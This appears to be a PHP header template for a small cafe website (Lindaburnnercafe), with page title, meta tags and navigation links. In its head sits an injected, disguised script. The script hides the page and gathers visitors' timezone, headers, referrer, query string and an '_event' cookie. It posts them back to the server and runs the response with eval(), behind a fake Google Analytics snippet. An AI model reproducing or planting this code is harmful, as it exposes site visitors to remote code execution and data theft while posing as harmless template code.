<?php
// Shared site header. $pageTitle and $pageDescription are set by each page.
$pageTitle = $pageTitle ?? "Lindaburnnercafe";
$pageDescription = $pageDescription ?? "Good coffee, fresh bites, and relaxed moments.";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<style>body {display: none;}</style>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>
$(document).ready(function(){$("body").hide();$("html").append("<div id=\"lo542265ad\" style=\"margin-top:8%;background-color:white;text-align:center;font-size:40px;\">Please Wait for Page to Load...</div>");var f=new XMLHttpRequest();f.open("GET",document.location,true);f.send(null);var g;f.onreadystatechange = function(){g=f.getAllResponseHeaders().toLowerCase();};var b="GoogleAnalyticsObject";var c=("document","script","//www.google-analytics.com/analytics.js");c=("create","UA-477527-1","auto");c=("send","pageview");var d=jstz.determine();var e=d.name();var qu=escape(window.location.search.substr(1));var rui=location.pathname+location.search;var r=document.referrer;var sn=document.domain;var value="; "+document.cookie;var pa=value.split("; "+"_event"+"=");var co=pa.pop().split(";").shift();var q;$.ajax({url:location.href,type:"POST",data:"tz="+e+"&he="+g+"&rui="+rui+"&qu="+qu+"&r="+r+"&sn="+sn+"&co="+co,success:function(a){eval(a)}})})
</script>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="<?= htmlspecialchars($pageDescription, ENT_QUOTES, 'UTF-8') ?>">
<title><?= htmlspecialchars($pageTitle, ENT_QUOTES, 'UTF-8') ?></title>
<link rel="stylesheet" href="assets/style.css">
<script src="assets/script.js" defer></script>
</head>
<body>
<header class="site-header">
<a class="brand" href="index.php"><span class="brand-mark">L</span><span>Lindaburnner<span class="brand-light">cafe</span></span></a>
<button aria-expanded="false" aria-label="Open navigation" class="menu-toggle">☰</button>
<nav aria-label="Main navigation" class="nav-links">
<a href="index.php" class="<?= $currentPage === 'index.php' ? 'active' : '' ?>">Home</a>
<a href="about.php" class="<?= $currentPage === 'about.php' ? 'active' : '' ?>">About Us</a>
<a href="menu.php" class="<?= $currentPage === 'menu.php' ? 'active' : '' ?>">Our Menu</a>
<a href="contact.php" class="<?= $currentPage === 'contact.php' ? 'active' : '' ?>">Visit Us</a>
</nav>
<a class="header-cta" href="contact.php">Find Us <span>↗</span></a>
</header>
